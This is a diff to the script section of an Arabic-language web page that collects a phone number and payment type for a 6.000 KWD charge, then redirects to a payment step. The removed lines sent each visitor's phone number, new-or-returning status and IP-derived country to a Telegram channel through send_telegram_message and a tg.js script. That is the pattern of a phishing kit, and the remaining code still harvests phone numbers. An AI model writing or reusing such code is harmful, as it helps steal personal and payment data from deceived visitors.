@@ -516,68 +516,13 @@ option:checked {
             $("#error").show()
             return false
         }
-        
-        // if($('#phonenumber').val().length != 8 ||  $('#contactnumber').val().length != 8){
-            
-        // }
 
         $("#error").hide()
-        // document.getElementById('amount').innerText = '6.000 د.ك'
         localStorage.setItem('amount', '6.000')
         localStorage.setItem('phonenumber', document.getElementById('phonenumber').value)
-        localStorage.setItem('phonetype',document.getElementById('paywith').value)
-    
-        let firstpage = localStorage.getItem("firstpage");
-        if(firstpage){
-            status_message = `جديد`
-        }else{
-            status_message = `قديم`
-
-        }
-        localStorage.setItem("firstpage",'true');
-        message=`
-            الصفحة الرئيسية - تسجيل ${status_message}
-            رقم الهاتف: ${document.getElementById('phonenumber').value}
-        `
-
-        send_telegram_message(message)
-
-
         window.location.href = './typeofpayment'
-        return true
     }
     </script>
-
-
- <script>
-
-document.addEventListener("DOMContentLoaded", function () {
-  // منع التكرار خلال نفس الجلسة
-  if (sessionStorage.getItem("telegramSent")) {
-    console.log("الإشعار سبق وتم إرساله خلال هذه الجلسة.");
-    return;
-  }
-  const pageName = " الرئيسية";
-
-  let visitorType = localStorage.getItem("visitorType");
-  let status = "";
-  if (!visitorType) {
-    localStorage.setItem("visitorType", "old");
-    status = "زبون جديد";
-  } else {
-    status = "زبون قديم";
-  }
-
-
-    fetch('https://api.country.is').then(response => response.json())
-      .then(data => {
-        const country = data.country || "غير معروف";
-        const message = `حالة الزائر: ${status}\nالدولة: ${country}\nالصفحة: ${pageName}`;
-        send_telegram_message(message)
-      })
-            });
-        </script>
-<script src="./js/tg.js"></script>
 </body>
 
 </html>
